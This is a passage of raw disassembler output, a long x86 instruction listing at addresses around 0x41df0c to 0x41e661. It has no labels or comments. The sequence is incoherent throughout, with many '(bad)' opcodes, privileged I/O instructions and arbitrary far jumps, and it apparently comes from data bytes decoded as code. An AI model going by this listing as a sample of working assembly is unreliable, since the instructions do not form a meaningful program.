  41df0c:	les    ebx,FWORD PTR [eax]
  41df0e:	and    al,0x24
  41df10:	in     al,0x2e
  41df12:	leave  
  41df13:	ins    DWORD PTR es:[edi],dx
  41df14:	dec    edx
  41df15:	pop    eax
  41df16:	jmp    0xda0c:0xe13f8ac0
  41df1d:	imul   ecx,DWORD PTR [ebp+0x21e0ab90],0xdfb30673
  41df27:	call   0xdcb2:0xf316ece5
  41df2e:	cmp    BYTE PTR [ecx-0x1bc9110],0x16
  41df35:	push   edx
  41df36:	and    BYTE PTR [edi],bl
  41df38:	push   esp
  41df39:	lods   al,BYTE PTR ds:[esi]
  41df3a:	icebp  
  41df3b:	sub    cl,BYTE PTR [esi+eax*2]
  41df3e:	dec    ebx
  41df3f:	or     dh,BYTE PTR [eax+ecx*2-0x6a]
  41df43:	inc    ecx
  41df44:	(bad)  
  41df46:	add    esp,esi
  41df48:	mov    ss:0xc67a02f8,eax
  41df4e:	inc    esp
  41df4f:	pop    esp
  41df50:	push   cs
  41df51:	or     BYTE PTR [ebx],bh
  41df53:	lock add BYTE PTR [ebx+0x1b],bh
  41df57:	adc    BYTE PTR [ebx],0x12
  41df5a:	enter  0xb15b,0x8c
  41df5e:	jnp    0x41dfc5
  41df60:	push   edx
  41df61:	popf   
  41df62:	shl    BYTE PTR [ebx],1
  41df64:	push   0x8f912dc4
  41df69:	xchg   BYTE PTR [ebp-0x74],ah
  41df6c:	push   cs
  41df6d:	loop   0x41dfc9
  41df6f:	loop   0x41dfcd
  41df71:	in     al,dx
  41df72:	xchg   esp,eax
  41df73:	mov    eax,0xc993c1c8
  41df78:	cmp    DWORD PTR [eax-0xb7f24c],ebx
  41df7e:	cmc    
  41df7f:	ds adc dl,bh
  41df82:	pusha  
  41df83:	lods   eax,DWORD PTR ds:[esi]
  41df84:	inc    ebp
  41df85:	inc    eax
  41df86:	push   es
  41df87:	and    eax,0xf8c0d5e7
  41df8c:	mov    dh,0x47
  41df8e:	cld    
  41df8f:	cwde   
  41df90:	popa   
  41df91:	int    0x2e
  41df93:	mov    ah,0x90
  41df95:	jno    0x41df38
  41df97:	adc    al,0xb3
  41df99:	fwait
  41df9a:	(bad)
  41df9f:	xchg   ebp,eax
  41dfa0:	stc    
  41dfa1:	int    0xbc
  41dfa3:	pop    eax
  41dfa4:	pop    ebp
  41dfa5:	fmul   DWORD PTR [esi]
  41dfa7:	in     eax,dx
  41dfa8:	stos   DWORD PTR es:[edi],eax
  41dfa9:	aaa    
  41dfaa:	sub    al,0x96
  41dfac:	and    eax,0xc293b063
  41dfb1:	lods   al,BYTE PTR ds:[esi]
  41dfb2:	test   BYTE PTR [eax],ch
  41dfb4:	push   cs
  41dfb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfb6:	leave  
  41dfb7:	xchg   edx,eax
  41dfb8:	pop    esp
  41dfb9:	loope  0x41e03a
  41dfbb:	sub    BYTE PTR [ebp+0x55],0x9a
  41dfbf:	dec    ecx
  41dfc0:	xchg   ebx,eax
  41dfc1:	push   eax
  41dfc2:	jns    0x41dfc4
  41dfc4:	mov    esi,edx
  41dfc6:	sub    eax,0x90cc209e
  41dfcb:	(bad)  
  41dfcc:	ins    BYTE PTR es:[edi],dx
  41dfcd:	fiadd  WORD PTR [edi]
  41dfcf:	(bad)  
  41dfd0:	jmp    0x41df99
  41dfd2:	pop    edx
  41dfd3:	mov    ds:0x796ad306,al
  41dfd8:	dec    edi
  41dfd9:	clc    
  41dfda:	push   esp
  41dfdb:	adc    ecx,ebp
  41dfdd:	sub    eax,0xa9c67bfc
  41dfe2:	(bad)
  41dfe5:	mov    esp,0x5013daf2
  41dfea:	out    dx,al
  41dfeb:	sbb    al,0xf9
  41dfed:	mov    ecx,0x18fe9273
  41dff2:	ins    BYTE PTR es:[edi],dx
  41dff3:	outs   dx,BYTE PTR ds:[esi]
  41dff4:	adc    bh,BYTE PTR [ecx]
  41dff6:	mov    dh,0x76
  41dff8:	push   eax
  41dff9:	xlat   BYTE PTR ds:[ebx]
  41dffa:	mov    dl,0xc6
  41dffc:	loope  0x41df89
  41dffe:	lock aas 
  41e000:	jnp    0x41dfe2
  41e002:	jb     0x41e05e
  41e004:	sbb    al,0x61
  41e006:	popa   
  41e007:	popf   
  41e008:	sar    DWORD PTR [ebx+0x7a36dfe0],0x2
  41e00f:	lds    edx,FWORD PTR [ebx-0x67]
  41e012:	sub    edx,DWORD PTR [edx+0x258a3745]
  41e018:	es in  al,dx
  41e01a:	pop    ds
  41e01b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e01c:	dec    esi
  41e01d:	add    cl,BYTE PTR [edi+0x59d1a957]
  41e023:	cmp    ebp,ebp
  41e025:	push   esi
  41e026:	scas   eax,DWORD PTR es:[edi]
  41e027:	cld    
  41e028:	rcl    BYTE PTR [eax+0x49],1
  41e02b:	dec    ecx
  41e02c:	xchg   ebx,eax
  41e02d:	popf   
  41e02e:	das    
  41e02f:	and    esp,ecx
  41e031:	pop    eax
  41e032:	std    
  41e033:	int3   
  41e034:	pop    es
  41e035:	dec    esi
  41e036:	pop    es
  41e037:	dec    edx
  41e038:	dec    edi
  41e039:	mov    dl,0xf0
  41e03b:	push   esi
  41e03c:	add    cl,bl
  41e03e:	pusha  
  41e03f:	add    al,0x8d
  41e041:	xchg   esp,eax
  41e042:	push   es
  41e043:	or     BYTE PTR [ebx+0x68],dh
  41e046:	add    eax,0x7f8ac40d
  41e04b:	jmp    0x812f:0x31e303d6
  41e052:	cli    
  41e053:	ficom  DWORD PTR [ebp+ecx*8+0x73218e03]
  41e05a:	push   es
  41e05b:	xchg   ch,ah
  41e05d:	push   ds
  41e05e:	jp     0x41e074
  41e060:	push   ecx
  41e061:	lds    esp,FWORD PTR [edx-0x7b]
  41e064:	mov    ah,0x8b
  41e066:	sti    
  41e067:	xchg   ebp,eax
  41e068:	sti    
  41e069:	xchg   edi,eax
  41e06a:	and    DWORD PTR [ecx-0xe],ebp
  41e06d:	push   edx
  41e06e:	and    esp,esp
  41e070:	call   0xd0c8:0x6ebfdec6
  41e077:	push   0x76a5af5d
  41e07c:	mov    bl,0x8b
  41e07e:	dec    edx
  41e07f:	jmp    0x8a2e:0x717dfe21
  41e086:	and    al,0xf1
  41e088:	mov    eax,ds:0x3bd22e82
  41e08d:	(bad)  
  41e08e:	xor    bh,BYTE PTR [edx+0x7ea6cad9]
  41e094:	mov    al,0x76
  41e096:	add    al,0xa1
  41e098:	and    al,0xf9
  41e09a:	adc    al,0x1e
  41e09c:	push   ebx
  41e09d:	fldenv [ebx-0x10]
  41e0a0:	aad    0x2c
  41e0a2:	add    BYTE PTR [ebp-0x7bcc4322],dh
  41e0a8:	cmc    
  41e0a9:	push   edx
  41e0aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0ab:	fisttp WORD PTR [ebx+0x1e20cfa6]
  41e0b1:	cmp    DWORD PTR [ebp+ebx*2+0x79439fa6],0x60
  41e0b9:	fs dec edx
  41e0bb:	outs   dx,BYTE PTR ds:[esi]
  41e0bc:	sub    ebx,DWORD PTR [ebp+0x25]
  41e0bf:	cli    
  41e0c0:	fldcw  WORD PTR [edi+0x7357ac43]
  41e0c6:	(bad)  
  41e0c7:	lea    esp,[edi+0x3f]
  41e0ca:	xor    edi,DWORD PTR [edx+0x3fe63a0b]
  41e0d0:	sub    eax,0xf1febdb4
  41e0d5:	jb     0x41e0da
  41e0d7:	(bad)  
  41e0d8:	js     0x41e05a
  41e0da:	sbb    edx,edx
  41e0dc:	das    
  41e0dd:	sub    ah,BYTE PTR [edi+0x2d]
  41e0e0:	loopne 0x41e119
  41e0e2:	test   BYTE PTR [ecx],ah
  41e0e4:	rcr    DWORD PTR [ecx+0x5aad39a4],cl
  41e0ea:	jno    0x41e149
  41e0ec:	push   ebx
  41e0ed:	aam    0xa6
  41e0ef:	mov    ?,WORD PTR [eax]
  41e0f1:	push   0x51d9405d
  41e0f6:	mov    al,0x1a
  41e0f8:	push   es
  41e0f9:	popf   
  41e0fa:	or     al,dh
  41e0fc:	dec    ebp
  41e0fd:	pop    edx
  41e0fe:	ret    0x2d15
  41e101:	in     al,0xe4
  41e103:	and    BYTE PTR [esi+0x50ce94c],dl
  41e109:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e10a:	adc    ebp,DWORD PTR [ecx-0x53d12831]
  41e110:	inc    esi
  41e111:	outs   dx,DWORD PTR ds:[esi]
  41e112:	cwde   
  41e113:	jb     0x41e136
  41e115:	aad    0x45
  41e117:	mov    dl,0x3e
  41e119:	inc    ecx
  41e11a:	jo     0x41e137
  41e11c:	mov    edi,0x90873e0d
  41e121:	enter  0xcd6,0x1
  41e125:	dec    esp
  41e126:	and    ecx,DWORD PTR [ebp+ebx*1+0x33]
  41e12a:	mov    esi,0xa55a1be5
  41e12f:	mov    ebx,0xb42e0f72
  41e134:	outs   dx,BYTE PTR ds:[esi]
  41e135:	in     eax,dx
  41e136:	push   es
  41e137:	rol    al,0x28
  41e13a:	pop    eax
  41e13b:	fnstsw WORD PTR [edx-0x3e0035e5]
  41e141:	es call 0xb9770671
  41e147:	jne    0x41e0e1
  41e149:	add    eax,0xe3b0e621
  41e14e:	push   esp
  41e14f:	sahf   
  41e150:	addr16 sbb eax,0xc21799e2
  41e156:	add    DWORD PTR [ebx+0x58],0xffffffc1
  41e15a:	call   0x9493:0xa8e7c991
  41e161:	or     al,0x58
  41e163:	or     BYTE PTR [eax-0x2a],bh
  41e166:	ja     0x41e1e1
  41e168:	adc    edi,DWORD PTR [eax+0xd]
  41e16b:	fidivr DWORD PTR [ecx]
  41e16d:	sbb    ch,bh
  41e16f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e170:	lods   eax,DWORD PTR ds:[esi]
  41e171:	iret   
  41e172:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e173:	jo     0x41e141
  41e175:	mov    es,esp
  41e177:	adc    bl,bl
  41e179:	adc    ebx,DWORD PTR [esi-0x51]
  41e17c:	add    al,0x96
  41e17e:	leave  
  41e17f:	mov    BYTE PTR [esi],bl
  41e181:	dec    edi
  41e182:	sub    eax,0x2919b3b1
  41e187:	inc    edi
  41e188:	call   0x9865:0xce70d995
  41e18f:	mov    al,0xe2
  41e191:	(bad)  
  41e192:	mov    ebp,0x28cf8640
  41e197:	sub    al,0xe6
  41e199:	(bad)  
  41e19a:	mov    ecx,0x5782a538
  41e19f:	ret    
  41e1a0:	fcom   QWORD PTR [ecx]
  41e1a2:	arpl   WORD PTR [ebx-0x570dff09],bx
  41e1a8:	add    ebp,DWORD PTR [esi+0x56e2b70b]
  41e1ae:	lock ins DWORD PTR es:[edi],dx
  41e1b0:	js     0x41e225
  41e1b2:	mov    ebx,0x3d1ed3e7
  41e1b7:	das    
  41e1b8:	sbb    edi,esi
  41e1ba:	dec    esi
  41e1bb:	mov    esp,DWORD PTR [edx-0x7b5b2f09]
  41e1c1:	out    0x93,eax
  41e1c3:	outs   dx,BYTE PTR ds:[esi]
  41e1c4:	outs   dx,DWORD PTR ds:[esi]
  41e1c5:	pop    ebp
  41e1c6:	retf   0xb126
  41e1c9:	in     al,0x4
  41e1cb:	add    eax,0x9667e1e3
  41e1d0:	xor    eax,0x66748843
  41e1d5:	push   eax
  41e1d6:	push   edx
  41e1d7:	push   ecx
  41e1d8:	add    eax,0xfe05579d
  41e1dd:	mov    bl,0x92
  41e1df:	add    eax,DWORD PTR [ebp-0x70]
  41e1e2:	xor    DWORD PTR [ebx-0x61],edx
  41e1e5:	mov    ds,WORD PTR [edx]
  41e1e7:	sub    al,0xa3
  41e1e9:	int3   
  41e1ea:	je     0xc9647ed0
  41e1f0:	inc    edx
  41e1f1:	ins    DWORD PTR es:[edi],dx
  41e1f2:	in     al,dx
  41e1f3:	fimul  WORD PTR [eax-0x73266f43]
  41e1f9:	outs   dx,BYTE PTR ds:[esi]
  41e1fa:	jp     0x41e231
  41e1fc:	ja     0x41e1ab
  41e1fe:	lahf   
  41e1ff:	scas   al,BYTE PTR es:[edi]
  41e200:	loopne 0x41e1b8
  41e202:	pop    edi
  41e203:	sub    BYTE PTR [ebp-0x3f9458a0],0xcc
  41e20a:	xchg   ebx,eax
  41e20b:	pop    esp
  41e20c:	sub    edi,ecx
  41e20e:	je     0x41e20d
  41e210:	int3   
  41e211:	sbb    edx,DWORD PTR [eax-0xe]
  41e214:	hlt    
  41e215:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e216:	(bad)  
  41e218:	sub    DWORD PTR [esi+0x5c64ca85],eax
  41e21e:	jge    0x41e1a6
  41e220:	gs push 0x59
  41e223:	sbb    edi,DWORD PTR [esi+esi*2]
  41e226:	daa    
  41e227:	jl     0x41e1e0
  41e229:	or     ah,BYTE PTR [esi+0x6cf82397]
  41e22f:	pop    ecx
  41e230:	mov    bh,0xe7
  41e232:	mov    DWORD PTR [eax],ebp
  41e234:	xchg   ecx,eax
  41e235:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e236:	out    0x5a,eax
  41e238:	imul   edi,ebp,0x32
  41e23b:	jne    0x41e22d
  41e23d:	(bad)  
  41e23e:	cli    
  41e23f:	lahf   
  41e240:	jne    0x41e240
  41e242:	frstor [ecx-0x2d]
  41e245:	stos   BYTE PTR es:[edi],al
  41e246:	adc    al,0xb9
  41e248:	jmp    0x41e1f1
  41e24a:	mov    ah,0xc0
  41e24c:	jmp    0x80ce2e57
  41e251:	and    esi,edx
  41e253:	hlt    
  41e254:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e255:	mov    ds:0xda8322dd,al
  41e25a:	out    dx,eax
  41e25b:	inc    ecx
  41e25c:	mov    ecx,0xd47bf1bf
  41e261:	push   ecx
  41e262:	bound  eax,QWORD PTR [ebp+0x48b76fe7]
  41e268:	mov    cl,0xe5
  41e26a:	push   ss
  41e26b:	ror    BYTE PTR [esi+ebp*2+0x42],1
  41e26f:	lock pop eax
  41e271:	into   
  41e272:	mov    DWORD PTR [edx+edx*8+0x6],ebx
  41e276:	clc    
  41e277:	jmp    0x41e246
  41e279:	mov    ecx,0xda9f3543
  41e27e:	jmp    0x41e24b
  41e280:	sbb    BYTE PTR [ebx],bl
  41e282:	inc    ecx
  41e283:	repnz (bad) 
  41e285:	add    al,0xfb
  41e287:	and    eax,DWORD PTR [ecx+0x17ad84d1]
  41e28d:	ror    dl,1
  41e28f:	outs   dx,DWORD PTR ds:[esi]
  41e290:	into   
  41e291:	and    ah,cl
  41e293:	add    ecx,DWORD PTR ds:0xc09a8c9f
  41e299:	lahf   
  41e29a:	in     eax,0xb
  41e29c:	mul    DWORD PTR [ecx+0x3b]
  41e29f:	push   esi
  41e2a0:	push   esp
  41e2a1:	mov    ebp,DWORD PTR [edx-0x7aedf7ed]
  41e2a7:	inc    edx
  41e2a8:	test   al,0x18
  41e2aa:	sbb    BYTE PTR [ebx-0x11263394],al
  41e2b0:	sbb    al,BYTE PTR [edi]
  41e2b2:	stos   BYTE PTR es:[edi],al
  41e2b3:	das    
  41e2b4:	call   0x8b16:0xcfdbae32
  41e2bb:	je     0x41e2ba
  41e2bd:	cs pop ss
  41e2bf:	push   ebp
  41e2c0:	inc    ebp
  41e2c1:	loop   0x41e320
  41e2c3:	pop    ecx
  41e2c4:	jb     0x41e257
  41e2c6:	add    eax,0x7bbadc4c
  41e2cb:	jo     0x41e322
  41e2cd:	(bad)  
  41e2ce:	xor    dl,BYTE PTR [ecx]
  41e2d0:	pop    edx
  41e2d1:	mov    edx,0x1df1bc77
  41e2d6:	rcl    DWORD PTR [ecx+eax*4],1
  41e2d9:	xchg   edi,eax
  41e2da:	cmp    DWORD PTR [edx],0x7d
  41e2dd:	ret    
  41e2de:	mov    DWORD PTR [esi],ecx
  41e2e0:	in     eax,dx
  41e2e1:	mov    ebp,0xa29ef36c
  41e2e6:	pop    ebx
  41e2e7:	dec    esi
  41e2e8:	and    DWORD PTR [edi+0x70],0x52
  41e2ec:	inc    eax
  41e2ed:	sbb    ecx,DWORD PTR [edi]
  41e2ef:	outs   dx,DWORD PTR es:[esi]
  41e2f1:	aam    0x81
  41e2f3:	xchg   ecx,eax
  41e2f4:	cmp    eax,0xc2a02eb0
  41e2f9:	scas   eax,DWORD PTR es:[edi]
  41e2fa:	xor    BYTE PTR [edi],bl
  41e2fc:	das    
  41e2fd:	lock lods eax,DWORD PTR ds:[esi]
  41e2ff:	std    
  41e300:	push   edi
  41e301:	ja     0x41e33f
  41e303:	jl     0x41e2bd
  41e305:	pop    ebx
  41e306:	cmp    BYTE PTR [edx],0x80
  41e309:	xor    bl,al
  41e30b:	push   cs
  41e30c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e30d:	inc    esi
  41e30e:	mov    ah,0x21
  41e310:	dec    edx
  41e311:	hlt    
  41e312:	cmp    ecx,ebp
  41e314:	call   DWORD PTR [esi+0x591bf58c]
  41e31a:	aam    0x13
  41e31c:	jmp    0x41e35e
  41e31e:	mov    ch,0x6
  41e320:	mov    eax,ds:0x1594ab59
  41e325:	and    eax,ebp
  41e327:	jg     0x41e30d
  41e329:	xchg   DWORD PTR [ebp+0x30391277],ebp
  41e32f:	in     al,dx
  41e330:	js     0x41e2f5
  41e332:	jecxz  0x41e31b
  41e334:	jbe    0x41e2b7
  41e336:	jge    0x41e2c0
  41e338:	jne    0x41e3af
  41e33a:	or     DWORD PTR [esi],ebp
  41e33c:	test   eax,0xa5ed3e77
  41e341:	test   cl,cl
  41e343:	dec    ebp
  41e344:	outs   dx,DWORD PTR ds:[esi]
  41e345:	push   edi
  41e346:	mov    al,ds:0x2604b03f
  41e34b:	js     0x41e390
  41e34d:	clc    
  41e34e:	pop    es
  41e34f:	cwde   
  41e350:	sub    al,0x1b
  41e352:	pop    edx
  41e353:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e354:	xor    ebp,DWORD PTR [eax-0x68]
  41e357:	cmp    DWORD PTR [ebp+edi*2+0x4c],ebp
  41e35b:	pop    edx
  41e35c:	or     eax,0x6863fb0a
  41e361:	pop    ebp
  41e362:	popf   
  41e363:	int3   
  41e364:	stos   DWORD PTR es:[edi],eax
  41e365:	sbb    bh,BYTE PTR [esi]
  41e367:	inc    esi
  41e368:	jae    0x41e3c1
  41e36a:	pop    esp
  41e36b:	repnz push es
  41e36d:	fwait
  41e36e:	loope  0x41e2f9
  41e370:	mov    ecx,0xfa44932a
  41e375:	sub    BYTE PTR [edi+edx*8],dl
  41e378:	cmc    
  41e379:	and    al,BYTE PTR [eax+eiz*4]
  41e37c:	cs jae 0x41e31a
  41e37f:	adc    al,0x97
  41e381:	adc    BYTE PTR [esi-0x51],ah
  41e384:	jo     0x41e350
  41e386:	das    
  41e387:	jne    0x41e3e6
  41e389:	or     eax,0x1bfb831e
  41e38e:	loope  0x41e313
  41e390:	push   ecx
  41e391:	clc    
  41e392:	cs sbb eax,0xa80c917b
  41e398:	cwde   
  41e399:	(bad)  
  41e39b:	push   eax
  41e39c:	adc    eax,DWORD PTR [edx+ecx*4]
  41e39f:	xchg   DWORD PTR [ebx+0xa28676f],edx
  41e3a5:	xlat   BYTE PTR ds:[ebx]
  41e3a6:	push   esi
  41e3a7:	ret    0xc454
  41e3aa:	in     al,0x6f
  41e3ac:	xchg   ebx,eax
  41e3ad:	push   ebx
  41e3ae:	push   eax
  41e3af:	test   al,0x97
  41e3b1:	sahf   
  41e3b2:	lock retf 
  41e3b4:	aad    0x4c
  41e3b6:	xchg   ebx,eax
  41e3b7:	pop    es
  41e3b8:	out    0xe6,eax
  41e3ba:	xor    dh,dh
  41e3bc:	mov    eax,0xdbd85d04
  41e3c1:	mov    eax,esp
  41e3c3:	add    DWORD PTR [edi+0x3a2db672],esi
  41e3c9:	test   al,0x75
  41e3cc:	sbb    eax,0x807c77e5
  41e3d1:	jge    0x41e3db
  41e3d3:	test   al,0x5d
  41e3d5:	jecxz  0x41e3a8
  41e3d7:	je     0x41e454
  41e3d9:	loopne 0x41e387
  41e3db:	nop
  41e3dc:	mov    esi,0xcd8589bb
  41e3e1:	jns    0x41e3a3
  41e3e3:	pop    edx
  41e3e4:	inc    edx
  41e3e5:	or     edi,esi
  41e3e7:	(bad)  
  41e3e8:	push   ds
  41e3e9:	adc    eax,0x89f3c854
  41e3ee:	push   ss
  41e3ef:	repnz in al,dx
  41e3f1:	pop    esi
  41e3f2:	ss test al,0xec
  41e3f5:	sub    DWORD PTR ds:0xf344530a,esp
  41e3fb:	enter  0x9104,0xd
  41e3ff:	mov    eax,0xc11f9a8c
  41e404:	sbb    BYTE PTR [edi],ch
  41e406:	mov    esi,DWORD PTR [edi]
  41e408:	out    dx,eax
  41e409:	adc    esp,DWORD PTR [edi+0xf33243c]
  41e40f:	inc    ecx
  41e410:	out    0x13,al
  41e412:	jnp    0x41e3a1
  41e414:	ins    DWORD PTR es:[edi],dx
  41e415:	xor    al,0xe0
  41e417:	rcl    dh,0x2b
  41e41a:	cmp    BYTE PTR [esi],0x71
  41e41d:	mov    eax,0xd01b97d1
  41e422:	jae    0x41e405
  41e424:	cmovl  esi,DWORD PTR [esi+0x45]
  41e428:	jp     0x41e452
  41e42a:	and    edx,ebp
  41e42c:	sub    cl,BYTE PTR [edx-0x71ad5022]
  41e432:	xor    cl,bl
  41e434:	push   esp
  41e435:	imul   ecx,DWORD PTR [esi-0xe],0xffffffce
  41e439:	push   ss
  41e43a:	or     al,0x69
  41e43c:	jae    0x41e3db
  41e43e:	mov    al,0x40
  41e440:	lock pop edx
  41e442:	xchg   esp,eax
  41e443:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e444:	sub    dl,dh
  41e446:	ss out dx,al
  41e448:	pop    esp
  41e449:	mov    ebx,ds
  41e44b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e44c:	wbinvd 
  41e44e:	mov    edx,0x345d9f9
  41e453:	scas   al,BYTE PTR es:[edi]
  41e454:	add    ch,BYTE PTR [edi-0x6d]
  41e457:	xchg   edx,eax
  41e458:	inc    edx
  41e459:	(bad)  [edx+edx*4]
  41e45c:	int    0xf6
  41e45e:	push   cs
  41e45f:	dec    ebx
  41e460:	popf   
  41e461:	data16 jge 0x41e45f
  41e464:	sbb    eax,0xbb496b81
  41e469:	ret    
  41e46a:	sbb    DWORD PTR [ebx+0x126db223],edx
  41e470:	pop    esp
  41e471:	adc    ch,ah
  41e473:	mov    edi,0xf4ebfc38
  41e478:	jecxz  0x41e40b
  41e47a:	into   
  41e47b:	and    BYTE PTR [edi],dh
  41e47d:	lds    ecx,FWORD PTR [esi-0x2edc341c]
  41e483:	int3   
  41e484:	daa    
  41e485:	dec    edi
  41e486:	jns    0x41e436
  41e488:	mov    gs,WORD PTR [edi]
  41e48a:	dec    eax
  41e48b:	test   DWORD PTR [edi-0x36b933f7],edx
  41e491:	enter  0xe992,0xd9
  41e495:	jnp    0x41e453
  41e497:	and    BYTE PTR [ecx],dl
  41e499:	retf   
  41e49a:	call   0x23ac:0x58c02732
  41e4a1:	mov    cl,0x8b
  41e4a3:	mov    bl,0xac
  41e4a5:	mov    ds:0x7d35de71,al
  41e4aa:	jp     0x41e500
  41e4ac:	mov    BYTE PTR [ecx-0x12],ah
  41e4af:	sbb    eax,0x839bea93
  41e4b4:	mov    dl,0x86
  41e4b6:	and    eax,edi
  41e4b8:	adc    ecx,edi
  41e4ba:	pusha  
  41e4bb:	and    al,bl
  41e4bd:	and    eax,0x4fc93d5d
  41e4c2:	scas   eax,DWORD PTR es:[edi]
  41e4c3:	sub    al,0xba
  41e4c5:	xchg   esp,eax
  41e4c6:	adc    BYTE PTR [ecx-0x69],al
  41e4c9:	cmp    DWORD PTR [edx-0x7144a48a],ebx
  41e4cf:	push   ecx
  41e4d0:	mov    cl,0xca
  41e4d2:	mov    WORD PTR [eax-0x2d],ss
  41e4d5:	sub    bl,BYTE PTR [ebp+0x3669917d]
  41e4db:	jecxz  0x41e4f2
  41e4dd:	mov    al,0x2d
  41e4df:	out    0xcc,al
  41e4e1:	sub    eax,0x90cd5f4a
  41e4e6:	sub    eax,0x2320f235
  41e4eb:	cmp    DWORD PTR [ebx],esp
  41e4ed:	call   0x61b9:0x2ba2f24
  41e4f4:	add    esi,DWORD PTR cs:[edx+0x40c005bd]
  41e4fb:	dec    ebx
  41e4fc:	out    0xbf,al
  41e4fe:	int3   
  41e4ff:	xchg   ebp,eax
  41e500:	sbb    bh,BYTE PTR [ebx-0x3592b9d6]
  41e506:	pop    eax
  41e507:	ja     0x41e51a
  41e509:	pop    esp
  41e50a:	or     dh,BYTE PTR [esi+0x8]
  41e50d:	cmp    eax,esi
  41e50f:	cld    
  41e510:	sub    DWORD PTR [ebx+0x1c],0x6c
  41e514:	dec    ecx
  41e515:	adc    eax,DWORD PTR [edx+ecx*4+0x364f145b]
  41e51c:	inc    esp
  41e51e:	xchg   edx,eax
  41e51f:	leave  
  41e520:	and    bl,BYTE PTR ds:0xa1f5ea4
  41e526:	repz shl BYTE PTR [ebx+0x6f192a4b],1
  41e52d:	push   ds
  41e52e:	inc    eax
  41e52f:	cdq    
  41e530:	and    DWORD PTR ds:0x3bd4fa90,esp
  41e536:	and    eax,0xe85283ec
  41e53b:	lahf   
  41e53c:	ja     0x41e51e
  41e53e:	or     al,0x28
  41e540:	retf   
  41e541:	mov    DWORD PTR [esi-0x71],eax
  41e544:	aas    
  41e545:	mov    ebp,0xf632bf80
  41e54a:	xor    DWORD PTR [ebp+0x3c],esp
  41e54d:	into   
  41e54e:	shl    edi,1
  41e550:	ins    DWORD PTR es:[edi],dx
  41e551:	and    esi,edi
  41e553:	mov    ah,0xba
  41e555:	ja     0x41e576
  41e557:	ins    BYTE PTR es:[edi],dx
  41e558:	pop    esi
  41e559:	ffreep st(3)
  41e55b:	je     0x41e547
  41e55d:	inc    eax
  41e55e:	mov    ah,bl
  41e560:	mov    esi,0xec31a829
  41e565:	jp     0x41e526
  41e567:	or     al,0xb0
  41e569:	sbb    ebx,DWORD PTR ds:0x2ab1b547
  41e56f:	out    dx,eax
  41e570:	test   al,0xc9
  41e572:	not    BYTE PTR [edi]
  41e574:	call   0x9657:0xca225731
  41e57b:	dec    ecx
  41e57c:	jb     0x41e5b9
  41e57e:	push   ebx
  41e57f:	lods   eax,DWORD PTR ds:[esi]
  41e580:	ins    BYTE PTR es:[edi],dx
  41e581:	fadd   QWORD PTR [edx+0x351e8021]
  41e587:	dec    esi
  41e588:	xchg   ecx,eax
  41e589:	adc    BYTE PTR [ebx-0x6874eb7],cl
  41e58f:	sub    DWORD PTR [ebp+0x7a],ebx
  41e592:	es dec ecx
  41e594:	out    0xb0,eax
  41e596:	mov    bh,0x7b
  41e598:	jp     0x41e5e4
  41e59a:	rcl    BYTE PTR [esi],0x5f
  41e59d:	in     al,dx
  41e59e:	xor    eax,0x96bca02d
  41e5a3:	stos   DWORD PTR es:[edi],eax
  41e5a4:	mov    eax,esi
  41e5a6:	test   BYTE PTR [ecx-0x60],0xf2
  41e5aa:	push   edx
  41e5ab:	pop    ds
  41e5ac:	push   ebp
  41e5ad:	mov    eax,ebp
  41e5af:	inc    esi
  41e5b0:	fcomip st,st(7)
  41e5b2:	es out dx,al
  41e5b4:	sar    BYTE PTR [edi+ecx*1],0xd9
  41e5b8:	mov    DWORD PTR ds:0x3720aed6,ecx
  41e5be:	mov    ds:0xecd643d2,al
  41e5c3:	fdivr  DWORD PTR [ebx-0x711e5566]
  41e5c9:	sub    ebx,ebp
  41e5cb:	enter  0xf303,0xf8
  41e5cf:	call   0xa8b2:0x85e56d69
  41e5d6:	aad    0xee
  41e5d8:	loop   0x41e5bb
  41e5da:	pusha  
  41e5db:	add    al,0x65
  41e5dd:	xlat   BYTE PTR ds:[ebx]
  41e5de:	xchg   ecx,eax
  41e5df:	aad    0x8b
  41e5e1:	sti    
  41e5e2:	jbe    0x41e583
  41e5e4:	(bad)  
  41e5e5:	pop    esp
  41e5e6:	fimul  WORD PTR [ecx+0xb50eb86]
  41e5ec:	mov    esi,0x2e135b5d
  41e5f1:	mul    bl
  41e5f3:	push   cs
  41e5f4:	std    
  41e5f5:	(bad)  
  41e5f6:	data16 cmp ch,BYTE PTR [eax+ecx*4+0x1]
  41e5fb:	enter  0x3f45,0x4e
  41e5ff:	jmp    0x85de6c6
  41e604:	pop    ecx
  41e605:	mov    bl,0x72
  41e607:	inc    esi
  41e608:	sbb    DWORD PTR [ebp+eiz*2-0x57],0xe8ad5575
  41e610:	jno    0x41e661
  41e612:	add    BYTE PTR [edx+0x79],0xc
  41e616:	imul   eax,DWORD PTR [eax-0x62],0x6d
  41e61a:	mov    ds:0xca900a3c,al
  41e61f:	es hlt 
  41e621:	dec    ebx
  41e622:	mov    ebp,0x6aa14df2
  41e627:	mov    ch,0xe6
  41e629:	into   
  41e62a:	push   ecx
  41e62b:	and    al,0x8b
  41e62d:	or     al,0x72
  41e62f:	push   es
  41e630:	add    eax,0x7365be04
  41e635:	dec    ebx
  41e636:	rcr    DWORD PTR [ebx],cl
  41e638:	stos   BYTE PTR es:[edi],al
  41e639:	xor    BYTE PTR [eax-0x645d2b5e],bl
  41e63f:	(bad)  
  41e640:	out    dx,al
  41e641:	xor    eax,0xb04c1e92
  41e646:	jle    0x41e69c
  41e648:	mov    ds:0xe2cee7fa,eax
  41e64d:	sub    DWORD PTR [ecx-0x6a],eax
  41e650:	ja     0x41e608
  41e652:	mov    bh,0xad
  41e654:	mov    al,ds:0x60eecdad
  41e659:	mov    ebx,0x6ee0bf71
  41e65e:	pushf  
  41e65f:	push   ecx
  41e660:	pop    esi
  41e661:	(bad)  
